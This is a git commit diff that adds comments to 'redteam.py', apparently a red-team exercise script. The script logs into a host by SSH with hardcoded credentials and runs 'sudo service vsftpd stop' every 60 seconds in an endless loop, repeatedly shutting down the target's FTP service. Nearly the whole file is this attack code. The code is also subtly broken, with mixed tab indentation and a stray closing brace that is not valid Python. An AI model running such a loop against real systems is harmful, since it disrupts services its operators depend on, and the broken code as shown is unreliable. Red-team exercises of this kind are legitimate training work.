5b0e2ab118aa601b284eff29709490c025e334bd
ak3064 <54552012+ak3064@users.noreply.github.com>
2023-04-18 11:37:10 -0400

    Update redteam.py
    Updated code with comments

--- redteam.py
+++ redteam.py
@@ -1,35 +1,35 @@
 import paramiko
 import time
 
-hostname = '10.0.3.15'
-username = 'home'
-password = 'redteam'
+hostname = '10.0.3.15' # this is whatever specific box we're targetting
+username = 'home' # current sudo user
+password = 'redteam' # this password can change
 
 ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # SSH add the key policy 
 
-while True:
+while True: # repeat forever
     try:
-        ssh.connect(hostname=hostname, username=username, password=password)
+        ssh.connect(hostname=hostname, username=username, password=password) # connecting to our host with our credentials
         
-        command = "sudo service vsftpd stop"
-        stdin, stdout, stderr = ssh.exec_command(command)
+        command = "sudo service vsftpd stop" # the specific command we're running (stopping ftp)
+        stdin, stdout, stderr = ssh.exec_command(command) # executing command and sending output to appropriate variables
 
         output = stdout.read().decode('utf-8')
         error = stderr.read().decode('utf-8')
 
         if output:
-            print(output)
+            print(output) # if all good
 
         if error:
-            print(error)
+            print(error) # if error
 
     except Exception as e:
-        print("Exception:", e)
+        print("Exception:", e) # if connection exception
 
     finally:
         ssh.close()
-		print('Done!')
+	print('Done!') # we're done!
 
-    time.sleep(60)
+    time.sleep(60) # sleep for 60 seconds and repeat
 }
